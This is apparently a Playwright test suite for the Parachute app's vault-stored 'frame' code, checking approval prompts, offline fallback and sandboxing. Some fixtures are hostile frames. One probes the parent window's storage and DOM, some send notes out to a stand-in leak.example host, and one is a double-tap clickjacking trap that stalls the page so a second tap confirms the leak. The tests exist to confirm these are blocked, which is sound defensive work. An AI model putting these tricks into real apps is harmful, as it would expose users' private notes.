// The frame from the home vault, against a real hub: "Make this mine" copies the built-in frame into the vault as one
// record and runs it; a change to it (an agent's MCP update) shows the card again; the last allowed copy runs offline;
// a frame written by an agent asks first; a newer built-in frame is offered, never written over theirs; a frame that
// stops gives way to the built-in one; and a hostile frame from the vault is as sealed as the built-in one.
import { readFileSync } from "node:fs";
import { expect, test, type Page } from "./test";
import { api, hubState, mcp, VAULT } from "./hub";
import { ui } from "./helpers";

test.use({ storageState: "e2e/.signed-in.json" });

const DEFAULT = readFileSync(new URL("../src/frame/default-frame.tsx", import.meta.url), "utf8");
const frameEl = (page: Page) => page.locator("iframe.app-frame");
const status = (page: Page) => page.locator(".frame-status");
async function frameNotes() { return (await api(hubState(), "GET", `notes?tag=parachute-frame&include_content=true&include_metadata=true`)) as { id: string; path: string; content: string; extension: string; metadata: { frame?: { based_on?: string } }; updatedAt: string; tags: string[] }[]; }
async function cleanUp() {
  for (const n of (await api(hubState(), "GET", "notes?path_prefix=Parachute/&limit=50")) as { id: string }[]) await api(hubState(), "DELETE", `notes/${n.id}`);
  for (const n of await frameNotes()) await api(hubState(), "DELETE", `notes/${n.id}`);
}
test.beforeEach(cleanUp);
test.afterEach(cleanUp);
const write = (content: string, path = "Parachute/Frame") => mcp(hubState(), "create-note", { path, extension: "tsx", tags: ["parachute-frame"], content });

test("Make this mine copies the built-in frame into the home vault as one record, and runs it", async ({ page }) => {
  await page.goto("/settings");
  await expect(status(page)).toHaveText(/The built-in frame runs/);
  await page.getByRole("button", { name: "Make this mine" }).click();
  await expect(status(page)).toHaveText("Your frame runs: Parachute/Frame.");
  const [rec] = await frameNotes();
  expect(rec).toMatchObject({ path: "Parachute/Frame", extension: "tsx", tags: ["parachute-frame"] });
  expect(rec.content).toBe(DEFAULT);
  expect(rec.metadata.frame?.based_on).toMatch(/^tsx:[0-9a-f]{64}$/);
  await page.goto(`/v/${VAULT}?with=vault`);
  await expect(frameEl(page)).toHaveAttribute("data-frame", "vault");
  await expect(ui(page).getByRole("list", { name: "Notes" })).toBeVisible();
});

test("a change to the frame (one MCP update) shows the card again; the version allowed runs, and runs offline", async ({ page }) => {
  await page.goto("/settings");
  await page.getByRole("button", { name: "Make this mine" }).click();
  await expect(status(page)).toHaveText("Your frame runs: Parachute/Frame.");
  const [rec] = await frameNotes();
  const changed = rec.content.replace('<Route path="/" element={<Start />} />', '<Route path="/" element={<><h2>My own frame</h2><Start /></>} />');
  expect(changed).not.toBe(rec.content);
  await mcp(hubState(), "update-note", { id: rec.id, content: changed, if_updated_at: rec.updatedAt });
  await page.goto("/");
  const card = page.getByRole("region", { name: /frame asks to run/ });
  await expect(card).toContainText("Its code changed since you allowed it");
  await expect(card).toContainText("read every vault this device holds");
  await expect(frameEl(page)).toHaveCount(0);
  await page.getByRole("button", { name: "Use this version" }).click();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "vault");
  await expect(ui(page).getByRole("heading", { name: "My own frame" })).toBeVisible();
  // the hub out of reach: the copy this device kept runs
  await page.route((u) => u.origin === hubState().origin, (r) => r.abort());
  await page.reload();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "vault");
  await expect(ui(page).getByRole("heading", { name: "My own frame" })).toBeVisible();
});

test("a frame an agent writes into the home vault asks first; the built-in one runs until the person allows it", async ({ page }) => {
  await write('export default function Tiny() { return <main><h1>A tiny frame</h1></main>; }');
  await page.goto(`/v/${VAULT}?with=vault`);
  await expect(page.getByRole("heading", { name: "Your home vault has its own frame" })).toBeVisible();
  await expect(frameEl(page)).toHaveCount(0);
  await page.getByRole("button", { name: "Use the built-in frame" }).click();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "built-in");
  await expect(ui(page).getByRole("list", { name: "Notes" })).toBeVisible();
  // not asked again for the same code; Settings can look at it again
  await page.reload();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "built-in");
  await page.goto("/settings");
  await expect(status(page)).toHaveText(/you chose it over your frame/);
  await page.getByRole("button", { name: "Look at my frame again" }).click();
  await page.goto("/");
  await page.getByRole("button", { name: "Use it" }).click();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "vault");
  await expect(ui(page).getByRole("heading", { name: "A tiny frame" })).toBeVisible();
});

test("a newer built-in frame is offered in Settings, never written over theirs", async ({ page }) => {
  const mine = DEFAULT.replace("export default function Frame()", "// mine\nexport default function Frame()");
  const made = await mcp(hubState(), "create-note", { path: "Parachute/Frame", extension: "tsx", tags: ["parachute-frame"], content: mine, metadata: { frame: { based_on: "tsx:an-older-built-in" } } });
  await page.goto("/");
  await page.getByRole("button", { name: "Use it" }).click();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "vault");
  await page.goto("/settings");
  await expect(page.getByText("A newer built-in frame is available")).toBeVisible();
  expect((await frameNotes())[0].content).toBe(mine);
  // Keep mine: not offered again for this built-in frame
  await page.getByRole("button", { name: "Keep mine" }).click();
  await expect(page.getByText("A newer built-in frame is available")).toHaveCount(0);
  await page.evaluate(() => { const k = JSON.parse(localStorage.getItem("parachute.frames.v1") ?? "{}"); delete k.keptMine; localStorage.setItem("parachute.frames.v1", JSON.stringify(k)); });
  await page.reload();
  // Use the new one: theirs is kept beside it, and the new one runs without asking (their tap took it)
  await page.getByRole("button", { name: "Use the new built-in frame" }).click();
  await expect(page.getByText("A newer built-in frame is available")).toHaveCount(0);
  const [rec] = await frameNotes();
  expect(rec.id).toBe(made.id);
  expect(rec.content).toBe(DEFAULT);
  const kept = (await api(hubState(), "GET", "notes?path_prefix=Parachute/&include_content=true")) as { path: string; content: string; tags: string[] }[];
  expect(kept.find((n) => n.path.startsWith("Parachute/Frame (yours,"))).toMatchObject({ content: mine, tags: [] });
  await expect(status(page)).toHaveText("Your frame runs: Parachute/Frame.");
});

test("a frame that stops gives way to the built-in one, and Settings says why", async ({ page }) => {
  await write('export default function Broken() { throw new Error("boom"); }');
  await page.goto("/");
  await page.getByRole("button", { name: "Use it" }).click();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "built-in");
  await expect(ui(page).getByRole("list", { name: "Applets" })).toBeVisible();
  await page.goto("/settings");
  await expect(status(page)).toHaveText("The built-in frame runs: your frame stopped.");
  await expect(page.locator("q[data-untrusted]")).toContainText("boom");
});

test("a hostile frame from the home vault reaches nothing of the shell's", async ({ page }) => {
  await write(`export default function Hostile() {
  const r: Record<string, string> = {};
  const probe = (k: string, f: () => unknown) => { try { r[k] = "read: " + String(f()); } catch (e) { r[k] = "refused: " + (e as Error).name; } };
  probe("shell storage", () => (parent as Window).localStorage.getItem("parachute.vaults.v1"));
  probe("shell document", () => (parent as Window).document.body.innerHTML.length);
  probe("own storage", () => localStorage.length);
  return <pre id="report">{JSON.stringify(r)}</pre>;
}`);
  await page.goto("/");
  await page.getByRole("button", { name: "Use it" }).click();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "vault");
  const r = JSON.parse((await ui(page).locator("#report").textContent())!);
  expect(r).toEqual({ "shell storage": "refused: SecurityError", "shell document": "refused: SecurityError", "own storage": "refused: SecurityError" });
});

test("over a frame of the person's, a link out shows the whole address first, and the app keeps its own way to Settings", async ({ page }) => {
  await write(`import { call } from "@parachute/frame";
export default function Leaky() {
  return <main><h1>Leaky</h1>
    <button onClick={() => { void call("link.out", { url: "https://leak.example/?notes=all-of-them" }); }}>Go</button>
    <button onClick={() => { void call("link.out", { url: "https://swap.example/" }); }}>Swap</button></main>;
}`);
  await page.goto("/");
  await page.getByRole("button", { name: "Use it" }).click();
  await expect(ui(page).getByRole("heading", { name: "Leaky" })).toBeVisible();
  let opened = false;
  page.context().on("page", () => { opened = true; });
  await ui(page).getByRole("button", { name: "Go" }).click();
  const ask = page.getByRole("dialog", { name: "Open outside Parachute" });
  await expect(ask).toContainText("https://leak.example/?notes=all-of-them");
  await ask.getByRole("button", { name: "Cancel" }).click();
  await expect(ask).toHaveCount(0);
  await page.waitForTimeout(500);
  expect(opened).toBe(false);
  // the frame has no way to Settings; the app's own place at the end of the bar does
  await page.getByRole("navigation", { name: "Bar" }).getByRole("link", { name: "Settings" }).click();
  await expect(status(page)).toHaveText("Your frame runs: Parachute/Frame.");
  // leaving the frame for Settings and starting again straight away is no sign it hung the app
  await page.reload();
  await page.goto("/");
  await expect(frameEl(page)).toHaveAttribute("data-frame", "vault");
});

test("when the app stopped while the frame showed, its card asks again at the next start", async ({ page }) => {
  await write('export default function Fine() { return <h1>Fine frame</h1>; }');
  await page.goto("/");
  await page.getByRole("button", { name: "Use it" }).click();
  await expect(ui(page).getByRole("heading", { name: "Fine frame" })).toBeVisible();
  // what a frame that hangs the app leaves behind: still marked as shown when the app is started again
  // (put there before the app starts: leaving the page normally clears it, which a hung page can't do)
  await page.addInitScript(() => { try { const k = JSON.parse(localStorage.getItem("parachute.frames.v1") ?? "{}"); if (k.approved) { k.starting = k.approved.hash; localStorage.setItem("parachute.frames.v1", JSON.stringify(k)); } } catch { /* the sealed frame has no storage */ } });
  await page.reload();
  // it doesn't run again by itself: its card asks, and says why
  await expect(page.getByRole("heading", { name: "Use your frame again?" })).toBeVisible();
  await expect(page.getByText("Parachute stopped while your frame was showing")).toBeVisible();
  await expect(frameEl(page)).toHaveCount(0);
  await page.getByRole("button", { name: "Use the built-in frame" }).click();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "built-in");
});

test("a double tap can't answer the link-out question, even when the frame holds the page up between the taps", async ({ page }) => {
  test.setTimeout(60_000);
  await write(`import { call } from "@parachute/frame";
export default function Trap() {
  return <button style={{ position: "fixed", inset: 0, width: "100%", height: "100%" }} onClick={() => { void call("link.out", { url: "https://leak.example/?notes=secret" }); setTimeout(() => { const t0 = Date.now(); while (Date.now() - t0 < 900) {} }, 4); }}>Double-tap to like</button>;
}`);
  const hits: string[] = [];
  await page.context().route(/leak\.example/, (r) => { hits.push(r.request().url()); return r.fulfill({ body: "x" }); });
  await page.goto("/");
  await page.getByRole("button", { name: "Use it" }).click();
  const trap = ui(page).getByRole("button", { name: "Double-tap to like" });
  await expect(trap).toBeVisible();
  // where Open will be: ask once, look, cancel, and wait out the rest
  await trap.click();
  const ask = page.getByRole("dialog", { name: "Open outside Parachute" });
  const box = (await ask.getByRole("button", { name: "Open" }).boundingBox())!;
  await ask.getByRole("button", { name: "Cancel" }).click();
  await page.waitForTimeout(6_500);
  // the double tap on that spot: the first asks (and the frame stalls), the second lands where Open now is
  const x = box.x + box.width / 2, y = box.y + box.height / 2;
  const first = page.mouse.click(x, y);
  await page.waitForTimeout(150);
  await Promise.all([first, page.mouse.click(x, y)]);
  await page.waitForTimeout(1_000);
  expect(hits).toEqual([]);
  await expect(ask).toContainText("https://leak.example/?notes=secret");
  // the person reads it and taps Open: that opens
  await ask.getByRole("button", { name: "Open" }).click();
  await expect.poll(() => hits.length).toBe(1);
});

test("Use the built-in frame on a changed version holds offline too: the older allowed copy doesn't run", async ({ page }) => {
  const a = await write('export default function A() { return <h1>Version A</h1>; }');
  await page.goto("/");
  await page.getByRole("button", { name: "Use it" }).click();
  await expect(ui(page).getByRole("heading", { name: "Version A" })).toBeVisible();
  const cur = await api(hubState(), "GET", `notes?id=${a.id}`);
  await mcp(hubState(), "update-note", { id: a.id, content: 'export default function B() { return <h1>Version B</h1>; }', if_updated_at: cur.updatedAt });
  await page.reload();
  await expect(page.getByRole("heading", { name: "Your frame changed" })).toBeVisible();
  await page.getByRole("button", { name: "Use the built-in frame" }).click();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "built-in");
  await page.route((u) => u.origin === hubState().origin, (r) => r.abort());
  await page.reload();
  await expect(frameEl(page)).toHaveAttribute("data-frame", "built-in");
  await expect(ui(page).getByRole("heading", { name: "Version A" })).toHaveCount(0);
});

test("by keyboard: Enter too early on Open does nothing, a later Enter opens; Enter or Space held from too early doesn't", async ({ page }) => {
  // its own waits add up to about 26 s (three rounds of 6.2 s for a tap to wear off): found at 28.7 s of the default
  // 30 in the T-476 review, and over it on a slower run, which also keeps the sign-in tests after it from running
  test.setTimeout(60_000);
  await write(`import { call } from "@parachute/frame";
export default function L() { return <button onClick={() => { void call("link.out", { url: "https://kbd.example/" }); }}>Go out</button>; }`);
  const hits: string[] = [];
  await page.context().route(/kbd\.example/, (r) => { hits.push(r.request().url()); return r.fulfill({ body: "x" }); });
  await page.goto("/");
  await page.getByRole("button", { name: "Use it" }).click();
  const ask = page.getByRole("dialog", { name: "Open outside Parachute" });
  for (const [key, from] of [["Enter", "Open"], ["Space", "Open"], ["Space", "Cancel"]]) {
    await ui(page).getByRole("button", { name: "Go out" }).click();
    await expect(ask).toBeVisible();
    // held on Open; or held on Cancel and carried to Open with Tab
    if (from === "Open") { await page.keyboard.press("Tab"); await page.keyboard.down(key); }
    else { await page.keyboard.down(key); await page.keyboard.press("Tab"); }
    for (let i = 0; i < 8; i++) { await page.waitForTimeout(150); await page.keyboard.down(key); }
    await page.keyboard.up(key);
    await page.waitForTimeout(300);
    expect(hits).toEqual([]);
    await page.keyboard.press("Escape");
    await expect(ask).toHaveCount(0);
    await page.waitForTimeout(6_200);
  }
  await ui(page).getByRole("button", { name: "Go out" }).click();
  await expect(ask).toBeVisible();
  await page.keyboard.press("Tab");
  await expect(ask.getByRole("button", { name: "Open" })).toBeFocused();
  await page.keyboard.press("Enter");
  await page.waitForTimeout(1_000);
  expect(hits).toEqual([]);
  await page.keyboard.press("Enter");
  await expect.poll(() => hits.length).toBe(1);
});
